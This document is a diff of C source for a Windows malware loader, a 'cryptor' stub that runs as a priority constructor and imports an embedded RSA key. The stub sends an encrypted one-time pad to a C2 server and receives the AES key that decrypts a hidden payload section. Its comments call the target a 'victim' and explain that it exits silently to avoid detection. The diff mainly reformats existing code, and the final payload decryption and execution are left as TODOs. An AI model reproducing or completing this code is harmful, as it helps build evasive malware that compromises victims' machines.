@@ -39,105 +39,100 @@ BCRYPT_KEY_HANDLE bcrypt_key_handle_rsa;
  * Because this is the highest priority constructor in the runtime environment setup it is given priority 101, equvilant destructor priority
  * is 101.
  */
-__attribute__((constructor(101), section(".cryptor"))) int construct(){
+__attribute__((constructor(101), section(".cryptor"))) int construct()
+{
+	typedef BOOL (*CIPKIE2)(DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, DWORD dwFlag, void *pvAuxInfo, BCRYPT_KEY_HANDLE *phKey);
+	CIPKIE2 CryptImportPublicKeyInfoEx2;
+	HMODULE CryptImport = LoadLibraryA("Crypt32.dll");
+	if( CryptImport ) 
+	{
+	 	CryptImportPublicKeyInfoEx2 = (CIPKIE2)GetProcAddress(CryptImport,"CryptImportPublicKeyInfoEx2");
+	}
+	/*
+	* Get the section offsets for the cryptor to decrypt the payload stub
+	*/
+	extern UINT64 START_OF_PAYLOAD;
+	extern UINT64 END_OF_PAYLOAD;
+	UINT64  addr_S = (UINT64)&START_OF_PAYLOAD;
+	UINT64  addr_e = (UINT64)&END_OF_PAYLOAD;
+	/*
+	 * Define vars necessary to decode the IV
+	 */
+	BYTE* iv = IV;
+	BYTE* decodedIV = malloc(IVLEN+1);
+	memset(decodedIV,0,IVLEN+1);
+	DWORD sz = IVLEN;
+	/*
+	 * define variables necessary to decode the public key
+	 */
+	BYTE* PemPubKey = PUBKEY; //Public key embedded in header
+	PCCERT_CONTEXT pCertContext = NULL;
+	BYTE* derPubKey;
+	DWORD derPubKeyLen = RSAKEYLEN;
+	BCRYPT_ALG_HANDLE alg;
+	CERT_PUBLIC_KEY_INFO *PubKeyInfo;
+	DWORD PubKeyInfoLen;
+	BYTE* recvData;
+	/*
+	 * Define Variables required to generate a cryptographically random integer
+	 */
+	BCRYPT_ALG_HANDLE randNumProv;
+	BYTE* OTP = malloc(AESKEYLEN+1);
+	memset(OTP,0,AESKEYLEN+1);
+	/* 
+	 * Define variables required to store the encrypted OTP
+	 */
+	PUCHAR EncryptedOTP;
+	ULONG EncryptedOTPLen;
+	ULONG EncryptedOTPWriteLen;
+	/*
+	* Definitions of variables for the windows client
+	*/
+	WSADATA  wsaData;
+	struct addrinfo *result = NULL, init = {0};
+	/*
+	* retrieving the public key
+	* in the event of an error silently exit 0. No reason to provide a return status to a victim
+	*/
+	if(!CryptStringToBinaryA(PemPubKey,0, CRYPT_STRING_ANY, NULL, &derPubKeyLen,NULL,NULL))
+	{
+		DWORD err = GetLastError();   
+		printf("DerLen %d",derPubKeyLen);
+		exit(0);
+	}
+	derPubKey = (BYTE*)malloc(derPubKeyLen);
+	if(!CryptStringToBinary(PemPubKey,0, CRYPT_STRING_BASE64, derPubKey, &derPubKeyLen,NULL,NULL))
+	{
+		DWORD err = GetLastError();   
+		printf("failed to decode pem %d",err);
+		exit(0);
+	}
+	if(BCryptOpenAlgorithmProvider(&alg, BCRYPT_RSA_ALGORITHM,NULL,0) != STATUS_SUCCESS)
+	{
+		printf("failed\n");
+		DWORD err = GetLastError();
+		printf("Error AlgProvider: %d",err);   
+		exit(0);
+	}
+    	if(!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, derPubKey,derPubKeyLen,
+		    CRYPT_DECODE_ALLOC_FLAG,NULL,&PubKeyInfo,&PubKeyInfoLen))
+	{
+		DWORD err = GetLastError();
+		printf("Error DecodeObject: %d",err);
+		exit(0);
+	}
+	if(!CryptImportPublicKeyInfoEx2( X509_ASN_ENCODING,PubKeyInfo,0, NULL,&bcrypt_key_handle_rsa))
+	{
+		DWORD err = GetLastError();
+		printf("Error ImportPubKeyInfo: %d",err);
+		exit(0);
+	}
 
-typedef BOOL (*CIPKIE2)(DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, DWORD dwFlag, void *pvAuxInfo, BCRYPT_KEY_HANDLE *phKey);
-CIPKIE2 CryptImportPublicKeyInfoEx2;
-HMODULE CryptImport = LoadLibraryA("Crypt32.dll");
-if( CryptImport ) {
-	
- CryptImportPublicKeyInfoEx2 = (CIPKIE2)GetProcAddress(CryptImport,"CryptImportPublicKeyInfoEx2");
-}
- /*
- * Get the section offsets for the cryptor to decrypt the payload stub
- */
-    extern UINT64 START_OF_PAYLOAD;
-    extern UINT64 END_OF_PAYLOAD;
-    UINT64  addr_S = (UINT64)&START_OF_PAYLOAD;
-    UINT64  addr_e = (UINT64)&END_OF_PAYLOAD;
-/*
- * Define vars necessary to decode the IV
- */
-    BYTE* iv = IV;
-    BYTE* decodedIV = malloc(IVLEN+1);
-    memset(decodedIV,0,IVLEN+1);
-    DWORD sz = IVLEN;
-/*
- * define variables necessary to decode the public key
- */
-    BYTE* PemPubKey = PUBKEY; //Public key embedded in header
-    PCCERT_CONTEXT pCertContext = NULL;
-    BYTE* derPubKey;
-    DWORD derPubKeyLen = RSAKEYLEN;
-    BCRYPT_ALG_HANDLE alg;
-    CERT_PUBLIC_KEY_INFO *PubKeyInfo;
-    DWORD PubKeyInfoLen;
-    BYTE* recvData;
-    /*HCRYPTPROV hProvRSA = 0;
-    HCRYPTKEY hKeyRSA = 0;*/
-/*
- * Define Variables required to generate a cryptographically random integer
- */
-
-    BCRYPT_ALG_HANDLE randNumProv;
-    BYTE* OTP = malloc(AESKEYLEN+1);
-    memset(OTP,0,AESKEYLEN+1);
-/* 
- * Define variables required to store the encrypted OTP
- */
-    PUCHAR EncryptedOTP;
-    ULONG EncryptedOTPLen;
-    ULONG EncryptedOTPWriteLen;
-
-/*
- * Definitions of variables for the windows client
- */
-    WSADATA  wsaData;
-    struct addrinfo *result = NULL, init = {0};
-    /*
-     * retrieving the public key
-     * in the event of an error silently exit 0. No reason to provide a return status to a victim
-     */
-   if(!CryptStringToBinaryA(PemPubKey,0, CRYPT_STRING_ANY, NULL, &derPubKeyLen,NULL,NULL))
-   {
-	DWORD err = GetLastError();   
-	printf("DerLen %d",derPubKeyLen);
-	exit(0);
-   }
-   derPubKey = (BYTE*)malloc(derPubKeyLen);
-   if(!CryptStringToBinary(PemPubKey,0, CRYPT_STRING_BASE64, derPubKey, &derPubKeyLen,NULL,NULL))
-   {
-	DWORD err = GetLastError();   
-	printf("failed to decode pem %d",err);
-	exit(0);
-   }
-   if(BCryptOpenAlgorithmProvider(&alg, BCRYPT_RSA_ALGORITHM,NULL,0) != STATUS_SUCCESS)
-   {
-            printf("failed\n");
-   	    DWORD err = GetLastError();
-	    printf("Error AlgProvider: %d",err);
-	   
-	    exit(0);
-    }
-    if(!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, derPubKey,derPubKeyLen,
-                            CRYPT_DECODE_ALLOC_FLAG,NULL,&PubKeyInfo,&PubKeyInfoLen))
-    {
-	    DWORD err = GetLastError();
-	    printf("Error DecodeObject: %d",err);
-	    exit(0);
-    }
-    if(!CryptImportPublicKeyInfoEx2( X509_ASN_ENCODING,PubKeyInfo,0, NULL,&bcrypt_key_handle_rsa))
-    {
-	    DWORD err = GetLastError();
-	    printf("Error ImportPubKeyInfo: %d",err);
-	    exit(0);
-    };
-
-/*
- * Generate a one time pad generation
- * Generate 32 random bytes. These bytes are sent to the server encrypted with RSA 4096
- * The bytes will be XORed against the AES key used to decrypt the .payload section.
- */
+	/*
+	 * Generate a one time pad generation
+	 * Generate random bytes. These bytes are sent to the server encrypted with RSA 
+	 * The bytes will be XORed against the AES key used to decrypt the .payload section.
+	 */
 
     	if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&randNumProv, BCRYPT_RNG_ALGORITHM, NULL, 0)))
 	{	
@@ -150,14 +145,13 @@ if( CryptImport ) {
 		exit(0);
     	}
 	if(!BCRYPT_SUCCESS(BCryptCloseAlgorithmProvider(randNumProv, 0)))
-		{
-			printf("error closing handaler");
-			exit(0);
-		}
+	{
+		printf("error closing handaler");
+		exit(0);
+	}
 	/*
  	* Encrypt the one time pad with the RSA key
- 	*/
-		
+ 	*/	
 	
 	if(BCryptEncrypt( bcrypt_key_handle_rsa,(PUCHAR)(OTP), AESKEYLEN, NULL,NULL,0, NULL,0/* Ignored because pbOutput is null*/, &EncryptedOTPLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
 	{
@@ -192,12 +186,12 @@ if( CryptImport ) {
         	exit(0);
     	}
 	
-/*
- * Attempt to connect to the C2 server to retrieve the keys necessary to decrypt
- * the payolad section, for this to work this client transmits a OTP that has been
- * encrypted using an RSA public key (Length defined by the Conf file, default 4096)
- */
-     	if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
+	/*
+	 * Attempt to connect to the C2 server to retrieve the keys necessary to decrypt
+	 * the payolad section, for this to work this client transmits a OTP that has been
+	 * encrypted using an RSA public key (Length defined by the Conf file, default 4096)
+	 */
+	if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
      	{   
         	exit(-1);
      	}
@@ -226,7 +220,9 @@ if( CryptImport ) {
 		printf("error sending EncryptedOTP (%d bytes).",EncryptedOTPWriteLen);
 		exit(-1);
 	}
-
+	/*
+	 * recieve the OTP encrypted AES key from the server
+	 */
 	recvData = realloc(recvData,AESKEYLEN+1);
 	if(!recv(Connection,recvData,AESKEYLEN,0))
 	{
@@ -238,27 +234,20 @@ if( CryptImport ) {
 		printf("0x%x ", *(recvData+x) ^ *(OTP+x));
 	}
 
+			
 	/*
-	 * send the EncryptedOTP to the server
+	 * Decode The IV
 	 */
-/** TODO
-  SEND ENCRYPTED OTP
- * RECIVE PAYLOAD ENCRYPTION KEY
- * USE OTP TO RETRIVE AES KEY
- */
-/*
- * Decode The IV
- */
-    if (!CryptStringToBinaryA(iv,IVENCLEN,CRYPT_STRING_BASE64, decodedIV,&sz,NULL,NULL))
-        exit(0); /*
-                  * silently exit, even though we exit with error we don't
-                  * give this information to the OS
-                  */
-/** TODO
- *  DECYPT PAYLOAD
- *  RUN PAYLOAD
- */
-return 0;
+	    if (!CryptStringToBinaryA(iv,IVENCLEN,CRYPT_STRING_BASE64, decodedIV,&sz,NULL,NULL))
+		exit(0); /*
+			  * silently exit, even though we exit with error we don't
+			  * give this information to the OS
+			  */
+	/** TODO
+	 *  DECYPT PAYLOAD
+	 *  RUN PAYLOAD
+	 */
+	return 0;
 }
 
 __attribute__((destructor(101),section(".cryptor"))) int destruct(){
